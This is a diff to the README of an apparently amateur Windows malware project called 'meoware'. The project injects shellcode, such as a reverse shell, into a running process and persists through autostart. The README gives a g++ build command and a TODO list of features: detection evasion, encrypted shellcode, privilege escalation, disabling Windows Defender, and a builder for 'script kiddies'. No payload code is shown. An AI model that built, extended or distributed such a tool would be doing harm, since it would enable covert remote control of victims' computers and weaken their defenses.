@@ -7,7 +7,7 @@ and injecting shell code in my example its reverse_shell
 
 ------------------------------------------------------------------------------------
 
-you nead to change the pass to the virus.ex in here + you can change the auto startup name 
+you nead to change the pass to the meoware.exe in here + you can change the auto startup name 
 
 
 
@@ -33,9 +33,9 @@ plus you can change the executeble to be injected in here :
 
 to build the repo try to do it with g++ or msvs
 
-g++ example :``` g++ add_to_startup.cpp find_pid.cpp shellinj.cpp -o shellinj.exe```
+g++ example :``` g++ add_to_startup.cpp find_pid.cpp shellinj.cpp -o meoware.exe```
 
-sorry idk how copy it to msvc  ¯\\_(ツ)_/¯
+sorry idk how copy it to msvs  ¯\\_(ツ)_/¯
 
 ----------------------------------------------------
 
@@ -44,8 +44,15 @@ why i did it ?
 i have nothin to do at holidays :-D
 
 --------------------------------------------------------
-TODO :add priv esc , make hard to detect , make the shell code encrypted , make the shell code inject "vir.dll" , make readme.md more beautiful (✿◡‿◡)
+TODO : make hard to detect , make the shell code encrypted ,  make readme.md more beautiful (✿◡‿◡), make a builder for script_kids (like you yes you the one how reading it)（￣︶￣）
 
+
+ON_WORKrn: add priv esc ,make the shell code inject "vir.dll" ,disable windows defender :)
 
 
 i would be happy to get help thanks
+----------------------------------------------------------------------------
+
+why the code so shity : 1:becouse i make it in my free time and i am to lazy for makeing it beautiful ,2: shutup scrypt_kiddie
+
+
